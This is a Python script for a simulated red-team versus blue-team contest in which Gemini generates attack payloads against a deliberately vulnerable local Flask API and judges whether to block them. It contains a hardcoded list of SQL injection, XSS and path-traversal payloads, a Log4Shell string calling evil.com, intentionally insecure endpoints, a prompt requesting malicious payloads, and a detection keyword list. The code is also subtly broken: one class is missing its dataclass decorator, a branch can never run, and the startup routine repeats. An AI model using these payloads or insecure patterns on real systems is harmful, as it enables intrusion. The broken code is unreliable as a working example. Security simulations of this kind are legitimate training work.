#!/usr/bin/env python3
"""
AI vs AI - Simulated API Warfare in Cyberspace
A cybersecurity simulation where Red Team AI attacks and Blue Team AI defends
"""

import json
import time
import random
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, asdict
from flask import Flask, request, jsonify
import threading
import requests
from queue import Queue
import google.generativeai as genai

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('warfare_simulation.log'),
        logging.StreamHandler()
    ]
)

@dataclass
class APIUsageStats:
    """Track API usage and costs"""
    total_calls: int = 0
    red_team_calls: int = 0
    blue_team_calls: int = 0
    failed_calls: int = 0
    estimated_cost: float = 0.0
    last_reset: datetime = None
    
    def __post_init__(self):
        if self.last_reset is None:
            self.last_reset = datetime.now()
class AttackAttempt:
    """Represents a single attack attempt"""
    round_number: int
    timestamp: str
    endpoint: str
    method: str
    payload: str
    attack_type: str
    red_strategy: str
    blue_decision: str
    blue_reasoning: str
    blocked: bool
    success: bool
    red_score_delta: int
    blue_score_delta: int

@dataclass
class GameState:
    """Tracks the overall game state"""
    round_number: int = 0
    red_score: int = 0
    blue_score: int = 0
    total_attacks: int = 0
    blocked_attacks: int = 0
    successful_attacks: int = 0
    red_memory: List[str] = None
    blue_memory: List[str] = None
    
    def __post_init__(self):
        if self.red_memory is None:
            self.red_memory = []
        if self.blue_memory is None:
            self.blue_memory = []

class GeminiAPI:
    """
    Real Gemini API integration with usage limiting and cost control
    """
    
    def __init__(self, api_key: Optional[str] = None, 
                 max_calls_per_minute: int = 10,
                 max_total_calls: int = 100,
                 cost_limit_usd: float = 1.0):
        """
        Initialize Gemini API with usage limits
        
        Args:
            api_key: Gemini API key
            max_calls_per_minute: Rate limit for API calls
            max_total_calls: Maximum total calls per session
            cost_limit_usd: Maximum estimated cost in USD
        """
        if api_key:
            genai.configure(api_key=api_key)
        else:
            # Try to get from environment variable
            api_key = os.getenv('GEMINI_API_KEY')
            if not api_key:
                raise ValueError("Gemini API key required. Set GEMINI_API_KEY environment variable or pass api_key parameter.")
            genai.configure(api_key=api_key)
        
        # Initialize the model - using Gemini Flash 2.5 as mentioned in your requirements
        self.model = genai.GenerativeModel('gemini-2.0-flash-exp')
        
        # Usage limits
        self.max_calls_per_minute = max_calls_per_minute
        self.max_total_calls = max_total_calls
        self.cost_limit_usd = cost_limit_usd
        
        # Usage tracking
        self.usage_stats = APIUsageStats()
        self.call_timestamps = []
        
        # Estimated cost per call (approximate for Gemini Flash)
        self.cost_per_call = 0.002  # ~$0.002 per call (estimate)
        
        # Cache for similar requests to reduce API calls
        self.response_cache = {}
        self.cache_max_age = timedelta(minutes=5)
        
        # Fallback payloads in case API fails or limits are reached
        self.fallback_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>", 
            "../../etc/passwd",
            "admin' OR '1'='1",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "javascript:alert(1)",
            "1' UNION SELECT password FROM users--",
            "<img src=x onerror=alert(1)>",
            "../../../windows/system32/config/sam"
        ]
        
        self.fallback_attack_types = [
            "SQL Injection", "XSS", "Path Traversal", "Authentication Bypass",
            "Template Injection", "Command Injection"
        ]
        
        logging.info(f"🤖 Gemini API initialized with limits:")
        logging.info(f"   📞 Max calls/minute: {max_calls_per_minute}")
        logging.info(f"   🔢 Max total calls: {max_total_calls}")
        logging.info(f"   💰 Cost limit: ${cost_limit_usd}")
    
    def _check_limits(self) -> bool:
        """Check if we can make an API call within limits"""
        now = datetime.now()
        
        # Clean old timestamps (older than 1 minute)
        self.call_timestamps = [ts for ts in self.call_timestamps if now - ts < timedelta(minutes=1)]
        
        # Check rate limit
        if len(self.call_timestamps) >= self.max_calls_per_minute:
            logging.warning(f"⚠️  Rate limit reached: {len(self.call_timestamps)} calls in last minute")
            return False
        
        # Check total calls limit
        if self.usage_stats.total_calls >= self.max_total_calls:
            logging.warning(f"⚠️  Total call limit reached: {self.usage_stats.total_calls}/{self.max_total_calls}")
            return False
        
        # Check cost limit
        if self.usage_stats.estimated_cost >= self.cost_limit_usd:
            logging.warning(f"⚠️  Cost limit reached: ${self.usage_stats.estimated_cost:.3f}/${self.cost_limit_usd}")
            return False
        
        return True
    
    def _get_cache_key(self, prompt: str) -> str:
        """Generate cache key for similar requests"""
        # Simple hash based on key parts of the prompt
        key_parts = []
        if "RED TEAM" in prompt:
            key_parts.append("red")
        if "BLUE TEAM" in prompt:
            key_parts.append("blue")
        
        # Add endpoint info if present
        if "/login" in prompt:
            key_parts.append("login")
        elif "/query" in prompt:
            key_parts.append("query")
        elif "/upload" in prompt:
            key_parts.append("upload")
        elif "/profile" in prompt:
            key_parts.append("profile")
        
        return "_".join(key_parts)
    
    def _check_cache(self, cache_key: str) -> Optional[Dict]:
        """Check if we have a cached response"""
        if cache_key in self.response_cache:
            cached_response, timestamp = self.response_cache[cache_key]
            if datetime.now() - timestamp < self.cache_max_age:
                logging.info(f"📋 Using cached response for {cache_key}")
                return cached_response
            else:
                # Remove expired cache entry
                del self.response_cache[cache_key]
        return None
    
    def _update_usage_stats(self, team: str, success: bool):
        """Update usage statistics"""
        self.usage_stats.total_calls += 1
        if team == "red":
            self.usage_stats.red_team_calls += 1
        else:
            self.usage_stats.blue_team_calls += 1
        
        if success:
            self.usage_stats.estimated_cost += self.cost_per_call
            self.call_timestamps.append(datetime.now())
        else:
            self.usage_stats.failed_calls += 1
    
    def generate_red_payload(self, endpoint: str, previous_attempts: List[str], 
                           blue_defenses: List[str]) -> Tuple[str, str, str]:
        """Generate a malicious payload using Gemini AI for the red team"""
        
        # Check cache first
        cache_key = f"red_{endpoint}_{len(previous_attempts)}"
        cached = self._check_cache(cache_key)
        if cached:
            return cached['payload'], cached['attack_type'], cached['strategy']
        
        # Check limits
        if not self._check_limits():
            logging.info("🔄 Using fallback payload due to API limits")
            return self._generate_fallback_red_payload(endpoint, previous_attempts)
        
        # Construct the red team prompt
        prompt = f"""You are a RED TEAM AI in a cybersecurity simulation. Your goal is to generate a malicious payload to test the security of a web API endpoint.

TARGET ENDPOINT: {endpoint}
PREVIOUS FAILED ATTEMPTS: {previous_attempts[-3:] if previous_attempts else 'None'}
BLUE TEAM'S RECENT DEFENSES: {blue_defenses[-2:] if blue_defenses else 'None'}

Generate a creative and realistic attack payload that could exploit common web vulnerabilities like:
- SQL Injection
- Cross-Site Scripting (XSS) 
- Path Traversal
- Authentication Bypass
- Template Injection
- Command Injection

Based on the endpoint and previous attempts, evolve your strategy to bypass the blue team's defenses.

Respond in this exact JSON format:
{{
    "payload": "your_malicious_payload_here",
    "attack_type": "type_of_attack",
    "strategy": "explanation_of_your_strategy"
}}

Be creative but realistic. This is for educational cybersecurity research."""

        try:
            response = self.model.generate_content(prompt)
            
            # Parse the JSON response
            response_text = response.text.strip()
            if response_text.startswith('```json'):
                response_text = response_text.replace('```json', '').replace('```', '').strip()
            
            parsed = json.loads(response_text)
            
            result = {
                'payload': parsed.get('payload', random.choice(self.fallback_payloads)),
                'attack_type': parsed.get('attack_type', 'AI-Generated Attack'),
                'strategy': parsed.get('strategy', 'AI-generated attack strategy')
            }
            
            # Cache the result
            self.response_cache[cache_key] = (result, datetime.now())
            
            # Update usage stats
            self._update_usage_stats("red", True)
            
            return result['payload'], result['attack_type'], result['strategy']
            
        except Exception as e:
            logging.warning(f"Gemini API call failed for red team: {e}. Using fallback.")
            self._update_usage_stats("red", False)
            return self._generate_fallback_red_payload(endpoint, previous_attempts)
    
    def _generate_fallback_red_payload(self, endpoint: str, previous_attempts: List[str]) -> Tuple[str, str, str]:
        """Generate fallback payload when API is unavailable"""
        # Simple logic to vary payloads based on endpoint
        if endpoint == '/login':
            payloads = ["admin' OR '1'='1", "admin'--", "' OR 1=1#"]
            attack_type = "SQL Injection"
            strategy = "Authentication bypass attempt"
        elif endpoint == '/query':
            payloads = ["'; DROP TABLE users--", "' UNION SELECT password FROM users--"]
            attack_type = "SQL Injection"
            strategy = "Database extraction attempt"
        elif endpoint == '/upload':
            payloads = ["../../etc/passwd", "../../../windows/system32/config/sam"]
            attack_type = "Path Traversal"
            strategy = "File system access attempt"
        else:
            payloads = self.fallback_payloads
            attack_type = random.choice(self.fallback_attack_types)
            strategy = "Fallback attack strategy"
        
        payload = random.choice(payloads)
        return payload, attack_type, strategy
    
    def analyze_blue_defense(self, payload: str, endpoint: str, 
                           attack_history: List[str]) -> Tuple[bool, str]:
        """Analyze if the payload should be blocked using Gemini AI (Blue Team)"""
        
        # Check cache first
        cache_key = f"blue_{endpoint}_{hash(payload) % 1000}"
        cached = self._check_cache(cache_key)
        if cached:
            return cached['should_block'], cached['reasoning']
        
        # Check limits
        if not self._check_limits():
            logging.info("🔄 Using fallback analysis due to API limits")
            return self._generate_fallback_blue_defense(payload)
        
        prompt = f"""You are a BLUE TEAM AI cybersecurity defense system. Analyze this incoming request and determine if it should be BLOCKED or ALLOWED.

REQUEST DETAILS:
- Endpoint: {endpoint}
- Payload: {payload}
- Recent Attack History: {attack_history[-3:] if attack_history else 'None'}

Analyze the payload for:
- SQL Injection attempts
- Cross-Site Scripting (XSS)
- Path Traversal attacks
- Authentication bypass attempts
- Template injection
- Command injection
- Other malicious patterns

Consider the context of the endpoint and any patterns from recent attacks.

Respond in this exact JSON format:
{{
    "should_block": true/false,
    "reasoning": "detailed_explanation_of_your_decision",
    "confidence": "high/medium/low"
}}

Be thorough in your analysis. False positives are better than missed attacks."""

        try:
            response = self.model.generate_content(prompt)
            
            # Parse the JSON response
            response_text = response.text.strip()
            if response_text.startswith('```json'):
                response_text = response_text.replace('```json', '').replace('```', '').strip()
            
            parsed = json.loads(response_text)
            
            should_block = parsed.get('should_block', False)
            reasoning = parsed.get('reasoning', 'AI analysis completed')
            confidence = parsed.get('confidence', 'medium')
            
            # Add confidence to reasoning
            reasoning_with_confidence = f"{reasoning} (Confidence: {confidence})"
            
            result = {
                'should_block': should_block,
                'reasoning': reasoning_with_confidence
            }
            
            # Cache the result
            self.response_cache[cache_key] = (result, datetime.now())
            
            # Update usage stats
            self._update_usage_stats("blue", True)
            
            return should_block, reasoning_with_confidence
            
        except Exception as e:
            logging.warning(f"Gemini API call failed for blue team: {e}. Using fallback analysis.")
            self._update_usage_stats("blue", False)
            return self._generate_fallback_blue_defense(payload)
    
    def _generate_fallback_blue_defense(self, payload: str) -> Tuple[bool, str]:
        """Generate fallback defense analysis when API is unavailable"""
        malicious_patterns = [
            "DROP TABLE", "UNION SELECT", "script>", "alert(", 
            "../", "passwd", "OR '1'='1", "${jndi:", "{{", "javascript:",
            "--", "#", "EXEC", "INSERT", "DELETE", "UPDATE"
        ]
        
        payload_lower = payload.lower()
        for pattern in malicious_patterns:
            if pattern.lower() in payload_lower:
                return True, f"Fallback analysis detected malicious pattern: {pattern}"
        
        return False, "Fallback analysis - no obvious malicious patterns detected"
    
    def get_usage_report(self) -> str:
        """Get a formatted usage report"""
        report = f"""
📊 API Usage Report:
   🔢 Total calls: {self.usage_stats.total_calls}/{self.max_total_calls}
   🔴 Red team calls: {self.usage_stats.red_team_calls}
   🔵 Blue team calls: {self.usage_stats.blue_team_calls}
   ❌ Failed calls: {self.usage_stats.failed_calls}
   💰 Estimated cost: ${self.usage_stats.estimated_cost:.3f}/${self.cost_limit_usd}
   📞 Calls in last minute: {len(self.call_timestamps)}/{self.max_calls_per_minute}
   📋 Cached responses: {len(self.response_cache)}
        """
        return report.strip()

class VulnerableAPI:
    """Flask API with intentionally vulnerable endpoints for testing"""
    
    def __init__(self, port=5000):
        self.app = Flask(__name__)
        self.port = port
        self.request_queue = Queue()
        self.setup_routes()
        
    def setup_routes(self):
        
        @self.app.route('/login', methods=['POST'])
        def login():
            username = request.json.get('username', '')
            password = request.json.get('password', '')
            
            # Log the request for analysis
            self.request_queue.put({
                'endpoint': '/login',
                'method': 'POST',
                'data': {'username': username, 'password': password}
            })
            
            # Simulate vulnerable authentication
            if "admin" in username.lower():
                return jsonify({"status": "success", "token": "admin_token_123"})
            return jsonify({"status": "failed", "message": "Invalid credentials"})
        
        @self.app.route('/query', methods=['GET'])
        def query():
            search = request.args.get('q', '')
            
            self.request_queue.put({
                'endpoint': '/query',
                'method': 'GET',
                'data': {'q': search}
            })
            
            # Simulate SQL injection vulnerability
            return jsonify({
                "results": f"Searching for: {search}",
                "query": f"SELECT * FROM products WHERE name LIKE '%{search}%'"
            })
        
        @self.app.route('/upload', methods=['POST'])
        def upload():
            filename = request.json.get('filename', '')
            content = request.json.get('content', '')
            
            self.request_queue.put({
                'endpoint': '/upload',
                'method': 'POST',
                'data': {'filename': filename, 'content': content}
            })
            
            return jsonify({"status": "uploaded", "filename": filename})
        
        @self.app.route('/profile', methods=['GET'])
        def profile():
            user_id = request.args.get('id', '1')
            
            self.request_queue.put({
                'endpoint': '/profile',
                'method': 'GET',
                'data': {'id': user_id}
            })
            
            return jsonify({
                "user_id": user_id,
                "profile": f"User profile for ID: {user_id}"
            })
    
    def start_server(self):
        """Start the Flask server in a separate thread"""
        def run():
            self.app.run(host='127.0.0.1', port=self.port, debug=False)
        
        server_thread = threading.Thread(target=run, daemon=True)
        server_thread.start()
        time.sleep(2)  # Give server time to start
        return server_thread

class RedTeamAI:
    """AI-driven attacker that generates malicious payloads"""
    
    def __init__(self, gemini_api: GeminiAPI):
        self.gemini = gemini_api
        self.memory = []
        self.successful_attacks = []
        self.failed_attacks = []
    
    def generate_attack(self, game_state: GameState) -> Dict:
        """Generate a new attack based on current game state and memory"""
        
        endpoints = ['/login', '/query', '/upload', '/profile']
        methods = ['POST', 'GET', 'POST', 'GET']
        
        endpoint_idx = random.randint(0, len(endpoints) - 1)
        endpoint = endpoints[endpoint_idx]
        method = methods[endpoint_idx]
        
        # Generate payload using "AI"
        payload, attack_type, strategy = self.gemini.generate_red_payload(
            endpoint, self.failed_attacks, game_state.blue_memory
        )
        
        # Evolve based on memory
        if self.memory:
            recent_failures = [m for m in self.memory if "blocked" in m]
            if len(recent_failures) > 3:
                # Try different approach
                payload = payload.replace("'", "\"").replace("<", "&lt;")
                strategy += " (evolved to evade recent blocks)"
        
        attack = {
            'endpoint': endpoint,
            'method': method,
            'payload': payload,
            'attack_type': attack_type,
            'strategy': strategy
        }
        
        self.memory.append(f"Round {game_state.round_number}: {strategy}")
        if len(self.memory) > 10:
            self.memory.pop(0)  # Keep only recent memory
        
        return attack
    
    def learn_from_result(self, attack: Dict, blocked: bool, success: bool):
        """Learn from the result of an attack"""
        if success:
            self.successful_attacks.append(attack['payload'])
        else:
            self.failed_attacks.append(attack['payload'])
        
        # Keep only recent attacks in memory
        if len(self.successful_attacks) > 5:
            self.successful_attacks.pop(0)
        if len(self.failed_attacks) > 10:
            self.failed_attacks.pop(0)

class BlueTeamAI:
    """AI-driven defender that analyzes and blocks malicious requests"""
    
    def __init__(self, gemini_api: GeminiAPI):
        self.gemini = gemini_api
        self.memory = []
        self.known_attacks = []
        self.false_positives = []
    
    def analyze_request(self, attack: Dict, game_state: GameState) -> Tuple[bool, str]:
        """Analyze incoming request and decide whether to block it"""
        
        payload = attack['payload']
        endpoint = attack['endpoint']
        
        # Use "AI" to analyze the request
        should_block, reasoning = self.gemini.analyze_blue_defense(
            payload, endpoint, self.known_attacks
        )
        
        # Learn from patterns in memory
        if self.memory:
            similar_attacks = [m for m in self.memory if payload[:10] in m]
            if similar_attacks and len(similar_attacks) > 2:
                should_block = True
                reasoning += " (pattern recognition from attack history)"
        
        # Update memory
        memory_entry = f"Round {game_state.round_number}: {reasoning}"
        self.memory.append(memory_entry)
        if len(self.memory) > 15:
            self.memory.pop(0)
        
        return should_block, reasoning
    
    def learn_from_result(self, attack: Dict, blocked: bool, actual_success: bool):
        """Learn from the result of the defense decision"""
        if blocked and not actual_success:
            # Correct block
            self.known_attacks.append(attack['payload'])
        elif not blocked and actual_success:
            # Missed attack - learn from it
            self.known_attacks.append(attack['payload'])
        elif blocked and not actual_success:
            # Possible false positive
            self.false_positives.append(attack['payload'])
        
        # Keep memory manageable
        if len(self.known_attacks) > 20:
            self.known_attacks.pop(0)

class WarfareSimulation:
    """Main simulation engine that orchestrates the AI warfare"""
    
    def __init__(self, max_rounds=50, gemini_api_key: Optional[str] = None,
                 max_calls_per_minute: int = 10, max_total_calls: int = 100,
                 cost_limit_usd: float = 1.0):
        self.max_rounds = max_rounds
        self.game_state = GameState()
        self.api_server = VulnerableAPI()
        self.gemini_api = GeminiAPI(
            gemini_api_key, 
            max_calls_per_minute=max_calls_per_minute,
            max_total_calls=max_total_calls,
            cost_limit_usd=cost_limit_usd
        )
        self.red_team = RedTeamAI(self.gemini_api)
        self.blue_team = BlueTeamAI(self.gemini_api)
        self.attack_log = []
        
    def execute_attack(self, attack: Dict) -> bool:
        """Execute an attack against the API and determine if it was successful"""
        
        try:
            endpoint = attack['endpoint']
            method = attack['method']
            payload = attack['payload']
            
            url = f"http://127.0.0.1:5000{endpoint}"
            
            if method == 'POST':
                if endpoint == '/login':
                    response = requests.post(url, json={
                        'username': payload,
                        'password': 'test'
                    }, timeout=5)
                elif endpoint == '/upload':
                    response = requests.post(url, json={
                        'filename': payload,
                        'content': 'test content'
                    }, timeout=5)
            else:  # GET
                if endpoint == '/query':
                    response = requests.get(url, params={'q': payload}, timeout=5)
                elif endpoint == '/profile':
                    response = requests.get(url, params={'id': payload}, timeout=5)
            
            # Determine success based on response (simplified)
            if response.status_code == 200:
                response_text = response.text.lower()
                # Check for signs of successful exploitation
                success_indicators = [
                    'admin_token', 'error', 'exception', 'root:', 'select *',
                    'alert', 'script', 'union'
                ]
                return any(indicator in response_text for indicator in success_indicators)
            
            return False
            
        except Exception as e:
            logging.error(f"Attack execution failed: {e}")
            return False
    
    def run_round(self) -> AttackAttempt:
        """Execute a single round of the simulation"""
        
        self.game_state.round_number += 1
        logging.info(f"\n=== ROUND {self.game_state.round_number} ===")
        
        # Red Team generates attack
        attack = self.red_team.generate_attack(self.game_state)
        logging.info(f"🔴 RED TEAM: {attack['strategy']}")
        logging.info(f"   Target: {attack['method']} {attack['endpoint']}")
        logging.info(f"   Payload: {attack['payload']}")
        
        # Blue Team analyzes attack
        should_block, blue_reasoning = self.blue_team.analyze_request(
            attack, self.game_state
        )
        
        blue_decision = "BLOCK" if should_block else "ALLOW"
        logging.info(f"🔵 BLUE TEAM: {blue_decision}")
        logging.info(f"   Reasoning: {blue_reasoning}")
        
        # Execute attack if not blocked
        attack_successful = False
        if not should_block:
            attack_successful = self.execute_attack(attack)
            self.game_state.total_attacks += 1
        else:
            self.game_state.blocked_attacks += 1
        
        # Score calculation
        red_score_delta = 0
        blue_score_delta = 0
        
        if should_block and not attack_successful:
            # Correct block
            blue_score_delta = 10
            logging.info("✅ Blue Team successfully blocked malicious attack!")
        elif not should_block and attack_successful:
            # Successful attack
            red_score_delta = 15
            self.game_state.successful_attacks += 1
            logging.info("💥 Red Team attack succeeded!")
        elif not should_block and not attack_successful:
            # Benign allow
            blue_score_delta = 2
            logging.info("✅ Blue Team correctly allowed benign request")
        else:
            # False positive
            red_score_delta = 5
            logging.info("⚠️  Blue Team false positive - blocked benign request")
        
        # Update scores
        self.game_state.red_score += red_score_delta
        self.game_state.blue_score += blue_score_delta
        
        # Create attack attempt record
        attempt = AttackAttempt(
            round_number=self.game_state.round_number,
            timestamp=datetime.now().isoformat(),
            endpoint=attack['endpoint'],
            method=attack['method'],
            payload=attack['payload'],
            attack_type=attack['attack_type'],
            red_strategy=attack['strategy'],
            blue_decision=blue_decision,
            blue_reasoning=blue_reasoning,
            blocked=should_block,
            success=attack_successful,
            red_score_delta=red_score_delta,
            blue_score_delta=blue_score_delta
        )
        
        # Let both teams learn from the result
        self.red_team.learn_from_result(attack, should_block, attack_successful)
        self.blue_team.learn_from_result(attack, should_block, attack_successful)
        
        # Update team memories in game state
        self.game_state.red_memory = self.red_team.memory.copy()
        self.game_state.blue_memory = self.blue_team.memory.copy()
        
        self.attack_log.append(attempt)
        
        # Display current scores
        logging.info(f"Scores - Red: {self.game_state.red_score} | Blue: {self.game_state.blue_score}")
        
        return attempt
    
    def run_simulation(self):
        """Run the complete simulation"""
        
        logging.info("🚀 Starting AI vs AI Cybersecurity Warfare Simulation")
        logging.info("=" * 60)
        
        # Start the vulnerable API server
        logging.info("Starting vulnerable API server...")
        self.api_server.start_server()
        
        try:
            # Run simulation rounds
            for round_num in range(1, self.max_rounds + 1):
                attempt = self.run_round()
                time.sleep(1)  # Brief pause between rounds
                
                # Periodic status updates
                if round_num % 10 == 0:
                    self.print_status_report()
            
            # Final results
            self.print_final_results()
            
        except KeyboardInterrupt:
            logging.info("\nSimulation interrupted by user")
            self.print_final_results()
        except Exception as e:
            logging.error(f"Simulation error: {e}")
            self.print_final_results()
    
    def print_status_report(self):
        """Print intermediate status report"""
        logging.info("\n" + "="*50)
        logging.info("📊 STATUS REPORT")
        logging.info(f"Rounds completed: {self.game_state.round_number}")
        logging.info(f"Red Team score: {self.game_state.red_score}")
        logging.info(f"Blue Team score: {self.game_state.blue_score}")
        logging.info(f"Total attacks: {self.game_state.total_attacks}")
        logging.info(f"Blocked attacks: {self.game_state.blocked_attacks}")
        logging.info(f"Successful attacks: {self.game_state.successful_attacks}")
        
        if self.game_state.total_attacks > 0:
            block_rate = (self.game_state.blocked_attacks / self.game_state.round_number) * 100
            success_rate = (self.game_state.successful_attacks / self.game_state.total_attacks) * 100
            logging.info(f"Block rate: {block_rate:.1f}%")
            logging.info(f"Attack success rate: {success_rate:.1f}%")
        
        # Add API usage report
        logging.info(self.gemini_api.get_usage_report())
        logging.info("="*50 + "\n")
    
    def print_final_results(self):
        """Print final simulation results"""
        logging.info("\n" + "🏆" + "="*58 + "🏆")
        logging.info("                    FINAL RESULTS")
        logging.info("🏆" + "="*58 + "🏆")
        
        # Determine winner
        if self.game_state.red_score > self.game_state.blue_score:
            winner = "🔴 RED TEAM (Attackers)"
            margin = self.game_state.red_score - self.game_state.blue_score
        elif self.game_state.blue_score > self.game_state.red_score:
            winner = "🔵 BLUE TEAM (Defenders)"
            margin = self.game_state.blue_score - self.game_state.red_score
        else:
            winner = "🤝 TIE GAME"
            margin = 0
        
        logging.info(f"Winner: {winner}")
        if margin > 0:
            logging.info(f"Victory margin: {margin} points")
        
        logging.info(f"\nFinal Scores:")
        logging.info(f"🔴 Red Team: {self.game_state.red_score}")
        logging.info(f"🔵 Blue Team: {self.game_state.blue_score}")
        
        logging.info(f"\nStatistics:")
        logging.info(f"Total rounds: {self.game_state.round_number}")
        logging.info(f"Total attacks attempted: {self.game_state.total_attacks}")
        logging.info(f"Attacks blocked: {self.game_state.blocked_attacks}")
        logging.info(f"Successful attacks: {self.game_state.successful_attacks}")
        
        if self.game_state.round_number > 0:
            block_rate = (self.game_state.blocked_attacks / self.game_state.round_number) * 100
            logging.info(f"Overall block rate: {block_rate:.1f}%")
        
        if self.game_state.total_attacks > 0:
            success_rate = (self.game_state.successful_attacks / self.game_state.total_attacks) * 100
            logging.info(f"Attack success rate: {success_rate:.1f}%")
        
        # Save detailed log
        self.save_detailed_log()
        
        # Final API usage report
        logging.info("\n" + self.gemini_api.get_usage_report())
        
        logging.info("="*60)
    
    def save_detailed_log(self):
        """Save detailed log of all attacks to JSON file"""
        log_data = {
            'simulation_summary': asdict(self.game_state),
            'attacks': [asdict(attempt) for attempt in self.attack_log]
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"warfare_simulation_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        logging.info(f"Detailed log saved to: {filename}")

def main():
    """Main entry point for the simulation"""
    print("🧠 AI vs AI — Simulated API Warfare in Cyberspace")
    print("🔥 Red Team vs Blue Team Cybersecurity Battle")
    print("🤖 Powered by Google Gemini 2.0 Flash")
    print("="*60)
    
    # Get Gemini API key
    gemini_key = os.getenv('GEMINI_API_KEY')
    if not gemini_key:
        print("⚠️  GEMINI_API_KEY environment variable not found!")
        gemini_key = input("Enter your Gemini API key (or press Enter to use mock mode): ").strip()
        if not gemini_key:
            print("⚠️  No API key provided. Please set GEMINI_API_KEY environment variable.")
            print("   Get your free API key at: https://makersuite.google.com/app/apikey")
            return
    
    # Get simulation parameters
    try:
        rounds = int(input("Enter number of rounds to simulate (default 25): ") or "25")
        rounds = max(1, min(rounds, 100))  # Limit to reasonable range
    except ValueError:
        rounds = 25
    
    # Get API usage limits
    print("\n🔧 API Usage Limits:")
    try:
        max_calls_per_minute = int(input("Max API calls per minute (default 10): ") or "10")
        max_total_calls = int(input("Max total API calls (default 100): ") or "100")
        cost_limit = float(input("Cost limit in USD (default $1.00): ") or "1.0")
    except ValueError:
        max_calls_per_minute = 10
        max_total_calls = 100
        cost_limit = 1.0
    
    print(f"\n🚀 Starting simulation with:")
    print(f"   🎯 Rounds: {rounds}")
    print(f"   ⏱️  Rate limit: {max_calls_per_minute} calls/minute")
    print(f"   🔢 Total calls: {max_total_calls}")
    print(f"   💰 Cost limit: ${cost_limit}")
    print("\nPress Ctrl+C to stop the simulation early\n")
    
    try:
        simulation = WarfareSimulation(
            max_rounds=rounds, 
            gemini_api_key=gemini_key,
            max_calls_per_minute=max_calls_per_minute,
            max_total_calls=max_total_calls,
            cost_limit_usd=cost_limit
        )
        simulation.run_simulation()
    except ValueError as e:
        print(f"❌ Error: {e}")
        print("Please check your Gemini API key and try again.") 
        
    print("🧠 AI vs AI — Simulated API Warfare in Cyberspace")
    print("🔥 Red Team vs Blue Team Cybersecurity Battle")
    print("🤖 Powered by Google Gemini 2.0 Flash")
    print("="*60)
    
    # Get Gemini API key
    gemini_key = os.getenv('GEMINI_API_KEY')
    if not gemini_key:
        print("⚠️  GEMINI_API_KEY environment variable not found!")
        gemini_key = input("Enter your Gemini API key (or press Enter to use mock mode): ").strip()
        if not gemini_key:
            print("⚠️  No API key provided. Please set GEMINI_API_KEY environment variable.")
            print("   Get your free API key at: https://makersuite.google.com/app/apikey")
            return
    
    try:
        rounds = int(input("Enter number of rounds to simulate (default 25): ") or "25")
        rounds = max(1, min(rounds, 100))  # Limit to reasonable range
    except ValueError:
        rounds = 25
    
    print(f"\nStarting simulation with {rounds} rounds...")
    print("Press Ctrl+C to stop the simulation early\n")
    
    try:
        simulation = WarfareSimulation(max_rounds=rounds, gemini_api_key=gemini_key)
        simulation.run_simulation()
    except ValueError as e:
        print(f"❌ Error: {e}")
        print("Please check your Gemini API key and try again.")

if __name__ == "__main__":
    main()
